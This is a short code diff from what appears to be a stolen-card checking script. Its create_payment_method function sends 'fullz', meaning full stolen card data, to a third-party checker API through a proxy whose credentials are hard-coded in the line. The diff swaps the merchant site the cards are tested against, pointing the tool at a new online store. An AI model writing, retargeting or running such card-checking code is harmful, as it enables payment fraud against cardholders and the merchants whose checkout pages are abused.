@@ -92,7 +92,7 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient, proxy_ur
         }
 
         final = await session.get(
-            f'https://ayanochk.vip/api/ppcpgatewayccn.php?lista={fullz}&proxy=178.128.69.159:31114:oc-045bd5bf215c66a611bed69974d9892d1715b3242d6ae48965c9989272c520c9:qrewlq6ifcv4&sites=https://geniimagazine.com/shop/genii-magazine-digital&xlite=undefined',
+            f'https://ayanochk.vip/api/ppcpgatewayccn.php?lista={fullz}&proxy=178.128.69.159:31114:oc-045bd5bf215c66a611bed69974d9892d1715b3242d6ae48965c9989272c520c9:qrewlq6ifcv4&sites=https://mandarli.com/product/999-mogoke-mee-shay&xlite=undefined',
             headers=headers,
         )
 
